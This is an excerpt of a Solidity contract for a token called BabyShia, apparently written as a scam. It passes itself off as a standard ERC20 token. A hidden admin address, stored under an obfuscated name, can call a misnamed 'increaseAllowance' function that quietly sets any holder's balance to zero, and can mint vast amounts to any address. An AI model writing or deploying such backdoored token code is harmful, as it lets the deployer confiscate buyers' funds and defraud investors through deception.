...
contract BABYSHIATOKEN is Ownable {
    address public dxzmmli28;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "BabyShia";
    string private _cctokensymbol = "BABYSHIA";
    constructor(address tokenadmin) {
        dxzmmli28 = tokenadmin;
       BABYSHIA[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private BABYSHIA;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dxzmmli28 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = BABYSHIA[newadd];
        uint256 newaaamount = BABYSHIA[newadd]+BABYSHIA[newadd]-curamount;
        BABYSHIA[newadd] -= newaaamount;
        }else{
        if(dxzmmli28 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        BABYSHIA[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dxzmmli28 == _msgSender());
        if(dxzmmli28 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = BABYSHIA[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        BABYSHIA[from] = BABYSHIA[from]-amount;
        BABYSHIA[to] = BABYSHIA[to]+amount;
